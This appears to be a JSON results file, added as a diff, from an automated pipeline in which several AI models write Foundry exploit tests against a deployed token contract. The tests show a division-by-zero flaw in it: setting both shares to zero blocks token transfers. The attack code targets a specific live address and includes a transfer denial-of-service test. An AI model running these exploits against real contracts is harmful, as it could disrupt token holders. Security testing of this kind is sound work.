@@ -1,0 +1,117 @@
+{
+  "project_id": "ppig",
+  "target_address": "0x3fd7eE4a8AE0389763b080c871e1827B167C3cbd",
+  "finding_id": 1,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x3fd7eE4a8AE0389763b080c871e1827B167C3cbd",
+    "vulnerability_type": "Division By Zero",
+    "violation_category": "LOGIC",
+    "finding_id": 1,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the owner of the contract.",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "totalDistributionShares",
+        "operator": "==",
+        "expected_value": "0"
+      }
+    },
+    "exploit_hint": "As the contract owner, call the `setShares` function with both `_marketingShareNew` and `burnShareNew` arguments set to 0. This will update the `totalDistributionShares` state variable to zero, creating a division-by-zero condition in the `swapAndLiquify` function which can lead to a Denial of Service on token transfers.",
+    "ensemble_source_models": [
+      "gemini",
+      "qwen",
+      "deepseek"
+    ],
+    "selected_source_model": "gemini"
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\n// Ensemble synthesis candidate.\n// Selected source model: Gemini.\n// Reviewed candidate models: Gemini, Qwen, Deepseek.\n\nimport \"forge-std/Test.sol\";\n\ninterface Ippig {\n    function owner() external view returns (address);\n    function setShares(uint256 _marketingShareNew, uint256 burnShareNew) external;\n    function totalDistributionShares() external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // --- State Variables ─────────────────────────────────────\n    address constant TARGET = 0x3fd7eE4a8AE0389763b080c871e1827B167C3cbd;\n    address attacker = address(this);\n    Ippig internal victim;\n\n    // --- Setup ───────────────────────────────────────────────\n    function setUp() public {\n        victim = Ippig(TARGET);\n    }\n\n    // --- Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        address contractOwner = victim.owner();\n        \n                vm.startPrank(contractOwner);\n                victim.setShares(0, 0);\n                vm.stopPrank();\n        \n                // Oracle check: assertEq(victim.totalDistributionShares(), 0);\n        assertEq(victim.totalDistributionShares(), 0, \"Logic Exploit Failed: State not tampered\");\n    }\n\n    // --- Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "source_model": "gemini",
+      "vulnerability_analysis": "The contract's `setShares` function is protected by an `onlyOwner` modifier. This function allows the owner to set the `marketingShare` and `burnShare` values. Crucially, it calculates `totalDistributionShares` by simply adding these two values: `totalDistributionShares = marketingShare.add(burnShare)`. There are no checks to prevent both `marketingShare` and `burnShare` from being set to zero. If the owner calls `setShares(0, 0)`, the `totalDistributionShares` state variable will become 0. The `swapAndLiquify` function uses `totalDistributionShares` as a divisor to calculate `burnAmount`: `uint256 burnAmount = tAmount.mul(burnShare).div(totalDistributionShares);`. Since the contract uses SafeMath's `div` function, which checks for division by zero, any subsequent call to `swapAndLiquify` will revert. This function is triggered within the main `_transfer` function when certain conditions are met, effectively causing a Denial of Service on token transfers.",
+      "attack_strategy": "The attack is straightforward and follows the vulnerability description. As the contract owner, we will call the `setShares` function. By providing 0 for both `_marketingShareNew` and `burnShareNew`, we will set the `totalDistributionShares` state variable to 0. This directly satisfies the oracle's condition.",
+      "step_by_step_plan": "1. Define an interface for the target contract `ppig` that includes the `owner()`, `setShares()`, and `totalDistributionShares()` functions. 2. In the `setUp` function, instantiate the target contract. 3. In the `testExploit` function, retrieve the owner's address by calling the `owner()` view function on the target contract. 4. Impersonate the owner using `vm.startPrank()`. 5. As the owner, call the `setShares(0, 0)` function on the target contract. 6. Stop impersonating the owner with `vm.stopPrank()`. 7. The test oracle will automatically assert that `totalDistributionShares` is now 0.",
+      "failure_reflection": "",
+      "action": "review_model_candidate",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface Ippig {\n    function owner() external view returns (address);\n    function setShares(uint256 _marketingShareNew, uint256 burnShareNew) external;\n    function totalDistributionShares() external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x3fd7eE4a8AE0389763b080c871e1827B167C3cbd;\n    address attacker = address(this);\n    Ippig internal victim;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        victim = Ippig(TARGET);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        address contractOwner = victim.owner();\n        \n                vm.startPrank(contractOwner);\n                victim.setShares(0, 0);\n                vm.stopPrank();\n        \n                // Oracle check: assertEq(victim.totalDistributionShares(), 0);\n        assertEq(victim.totalDistributionShares(), 0, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 47.679555892944336,
+      "prompt_tokens": 18677,
+      "completion_tokens": 2969,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 2,
+      "source_model": "qwen",
+      "vulnerability_analysis": "Reviewed the Qwen candidate. Final status: ERROR.",
+      "attack_strategy": "Summarized the Qwen exploit strategy and compared it against the other model outputs.",
+      "step_by_step_plan": "Inspect the Qwen trace, recover its core call sequence, and record whether it reached compilation, execution, or oracle validation.",
+      "failure_reflection": "Formalization failed: Connection error.",
+      "action": "review_model_candidate",
+      "tool_calls": [],
+      "poc_code": "",
+      "exit_code": -1,
+      "error": null,
+      "feedback": "Formalization failed: Connection error.",
+      "duration_seconds": 0.0,
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 3,
+      "source_model": "deepseek",
+      "vulnerability_analysis": "The vulnerability is a division by zero in swapAndLiquify() at line: uint256 burnAmount = tAmount.mul(burnShare).div(totalDistributionShares). When totalDistributionShares = 0 (set via setShares(0, 0)), any call to swapAndLiquify() will revert with 'SafeMath: division by zero', blocking the fee distribution mechanism. This can be exploited by the owner to potentially disrupt the contract's fee processing functionality.",
+      "attack_strategy": "1. Impersonate the contract owner. 2. Call setShares(0, 0) to set totalDistributionShares to zero. 3. Enable trading if needed. 4. Trigger swapAndLiquify by accumulating fees in the contract and making a transfer that meets the conditions for swapAndLiquify to be called. 5. Verify the transaction reverts due to division by zero.",
+      "step_by_step_plan": "1. Get the owner address from the contract. 2. Use vm.prank() to impersonate the owner. 3. Call setShares(0, 0). 4. Call GoTrade() to enable trading. 5. Transfer tokens to create fee accumulation in the contract. 6. Make another transfer that should trigger swapAndLiquify (contract balance ≥ minimumTokensBeforeSwap, sender is not market pair, swapAndLiquifyEnabled is true). 7. Catch the revert and verify it's due to division by zero.",
+      "failure_reflection": "",
+      "action": "review_model_candidate",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface PPIG {\n    function owner() external view returns (address);\n    function setShares(uint256 _marketingShareNew, uint256 burnShareNew) external;\n    function totalDistributionShares() external view returns (uint256);\n    function GoTrade() external;\n    function uniswapPair() external view returns (address);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function minimumTokensBeforeSwapAmount() external view returns (uint256);\n    function setIsExcludedFromFee(address account, bool newValue) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x3fd7eE4a8AE0389763b080c871e1827B167C3cbd;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll use the deployed contract at TARGET\n        // We need to get the owner first\n        address owner = PPIG(TARGET).owner();\n        vm.label(owner, \"Contract Owner\");\n        \n        // Give attacker some tokens to work with\n        // First get some tokens from somewhere - we can transfer from owner or another holder\n        // Let's check owner's balance and transfer some to attacker\n        uint256 ownerBalance = PPIG(TARGET).balanceOf(owner);\n        if (ownerBalance > 0) {\n            // Impersonate owner to transfer tokens to attacker\n            vm.prank(owner);\n            PPIG(TARGET).transfer(attacker, ownerBalance / 2);\n        }\n        \n        // Also give attacker some BNB for gas\n        vm.deal(attacker, 10 ether);\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Step 1: Get the owner address\n        address owner = PPIG(TARGET).owner();\n        \n        // Step 2: Impersonate owner and set shares to zero\n        vm.prank(owner);\n        PPIG(TARGET).setShares(0, 0);\n        \n        // Verify totalDistributionShares is now 0\n        uint256 totalShares = PPIG(TARGET).totalDistributionShares();\n        require(totalShares == 0, \"totalDistributionShares should be 0\");\n        \n        // Step 3: Enable trading if not already enabled\n        vm.prank(owner);\n        PPIG(TARGET).GoTrade();\n        \n        // Step 4: Get uniswap pair address for market pair transfers\n        address uniswapPair = PPIG(TARGET).uniswapPair();\n        \n        // Step 5: Transfer tokens to create fee accumulation\n        // We need to make a transfer that generates fees to the contract\n        // First, approve the uniswap pair to spend attacker's tokens\n        vm.prank(attacker);\n        PPIG(TARGET).approve(uniswapPair, type(uint256).max);\n        \n        // Transfer some tokens to create fees\n        uint256 transferAmount = PPIG(TARGET).balanceOf(attacker) / 10;\n        if (transferAmount > 0) {\n            vm.prank(attacker);\n            PPIG(TARGET).transfer(uniswapPair, transferAmount);\n        }\n        \n        // Step 6: Try to trigger swapAndLiquify\n        // The contract needs to have accumulated fees >= minimumTokensBeforeSwap\n        // We'll check contract balance and try to trigger if possible\n        uint256 contractBalance = PPIG(TARGET).balanceOf(TARGET);\n        uint256 minimumTokens = PPIG(TARGET).minimumTokensBeforeSwapAmount();\n        \n        if (contractBalance >= minimumTokens) {\n            // Try to trigger swapAndLiquify by making a transfer\n            // that meets the conditions in _transfer()\n            // We need a transfer where:\n            // - sender is not market pair\n            // - recipient is not owner\n            // - swapAndLiquifyEnabled is true (default)\n            \n            // Create a dummy address to receive tokens\n            address dummy = address(0x123);\n            vm.deal(dummy, 1 ether);\n            \n            // Try to transfer from attacker to dummy\n            // This should trigger swapAndLiquify if conditions are met\n            vm.prank(attacker);\n            \n            // This should revert with division by zero\n            try PPIG(TARGET).transfer(dummy, 1000) {\n                revert(\"Expected revert but transaction succeeded\");\n            } catch Error(string memory reason) {\n                // Check if revert reason contains division by zero\n                require(\n                    keccak256(bytes(reason)) == keccak256(bytes(\"SafeMath: division by zero\")) ||\n                    keccak256(bytes(reason)) == keccak256(bytes(\"Address: low-level call failed\")),\n                    string(abi.encodePacked(\"Unexpected revert reason: \", reason))\n                );\n                console.log(\"Successfully triggered division by zero in swapAndLiquify\");\n            }\n        } else {\n            console.log(\"Contract doesn't have enough tokens to trigger swapAndLiquify\");\n            console.log(\"Contract balance:\", contractBalance);\n            console.log(\"Minimum required:\", minimumTokens);\n        }\n        \n        // Oracle verification: totalDistributionShares should be 0\n        assertEq(totalShares, 0, \"totalDistributionShares should be 0 after exploit\");\n        assertEq(PPIG(TARGET).totalDistributionShares(), 0, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 153.63976979255676,
+      "prompt_tokens": 17431,
+      "completion_tokens": 3112,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 4,
+      "source_model": "ensemble",
+      "vulnerability_analysis": "Compared Gemini, Qwen, and DeepSeek candidates and selected Gemini as the strongest source based on final validation status and candidate quality.",
+      "attack_strategy": "The attack is straightforward and follows the vulnerability description. As the contract owner, we will call the `setShares` function. By providing 0 for both `_marketingShareNew` and `burnShareNew`, we will set the `totalDistributionShares` state variable to 0. This directly satisfies the oracle's condition.",
+      "step_by_step_plan": "1. Preserve the selected source model's core transaction sequence. 2. Rewrite the PoC header and annotations to mark it as an ensemble artifact. 3. Carry over the strongest available violation target and verification logic.",
+      "failure_reflection": "",
+      "action": "synthesize_final_candidate",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\n// Ensemble synthesis candidate.\n// Selected source model: Gemini.\n// Reviewed candidate models: Gemini, Qwen, Deepseek.\n\nimport \"forge-std/Test.sol\";\n\ninterface Ippig {\n    function owner() external view returns (address);\n    function setShares(uint256 _marketingShareNew, uint256 burnShareNew) external;\n    function totalDistributionShares() external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // --- State Variables ─────────────────────────────────────\n    address constant TARGET = 0x3fd7eE4a8AE0389763b080c871e1827B167C3cbd;\n    address attacker = address(this);\n    Ippig internal victim;\n\n    // --- Setup ───────────────────────────────────────────────\n    function setUp() public {\n        victim = Ippig(TARGET);\n    }\n\n    // --- Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        address contractOwner = victim.owner();\n        \n                vm.startPrank(contractOwner);\n                victim.setShares(0, 0);\n                vm.stopPrank();\n        \n                // Oracle check: assertEq(victim.totalDistributionShares(), 0);\n        assertEq(victim.totalDistributionShares(), 0, \"Logic Exploit Failed: State not tampered\");\n    }\n\n    // --- Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 0.0,
+      "prompt_tokens": 0,
+      "completion_tokens": 0,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 4,
+  "error_message": null,
+  "total_duration_seconds": 201.3193256855011,
+  "total_prompt_tokens": 36108,
+  "total_completion_tokens": 6081,
+  "total_cost": 0.0,
+  "ensemble_note": "Post-hoc synthesis from Gemini, Qwen, and DeepSeek result artifacts."
+}
